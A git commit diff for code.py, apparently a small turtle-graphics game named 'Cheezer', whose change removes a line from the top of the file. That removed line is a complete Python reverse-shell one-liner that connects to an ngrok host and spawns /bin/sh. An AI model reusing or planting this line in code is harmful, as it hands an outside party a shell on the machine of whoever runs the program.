f58a2c1c6f58cdc022055c165100202cc9fd3ca1
Stuuupidfish <166348875+Stuuupidfish@users.noreply.github.com>
2024-04-07 21:42:50 -0500

    Update code.py
    um by michelles advice

--- code.py
+++ code.py
@@ -1,7 +1,5 @@
 # Cheezer
 
-import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("8.tcp.ngrok.io",19089));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/sh")
-
 import turtle
 import random
 import time
